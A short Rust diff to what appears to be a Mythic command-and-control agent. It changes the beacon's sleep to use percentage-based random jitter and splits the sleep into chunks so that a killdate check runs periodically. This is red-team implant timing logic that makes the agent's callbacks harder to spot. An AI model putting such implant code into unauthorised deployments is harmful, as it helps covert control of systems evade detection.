@@ -64,14 +64,24 @@ fn flush_pending<C: C2Transport>(mythic: &MythicAgent, c2: &C, pending: Vec<Task
 
 fn sleep_with_jitter() {
     let interval = INTERVAL.load(Ordering::Acquire);
-    let jitter = JITTER.load(Ordering::Acquire);
     if interval == 0 {
         return;
     }
-    sleep(Duration::from_secs(interval));
-    if jitter > 0 {
-        let extra = (jitter as f64 * rand::random::<f64>()) as u64;
-        sleep(Duration::from_secs(extra));
+    // JITTER is a percentage (0–100): extra sleep = interval * jitter% * random
+    let jitter_pct = JITTER.load(Ordering::Acquire).min(100);
+    let jitter_secs = if jitter_pct > 0 {
+        (interval * jitter_pct / 100) as f64 * rand::random::<f64>()
+    } else {
+        0.0
+    };
+    let total_sleep = interval as f64 + jitter_secs;
+
+    // Sleep in 60-second chunks so killdate is checked reasonably often
+    let mut remaining = (total_sleep as u64).max(1);
+    while remaining > 0 && !past_killdate() {
+        let chunk = remaining.min(60);
+        sleep(Duration::from_secs(chunk));
+        remaining -= chunk;
     }
 }
 
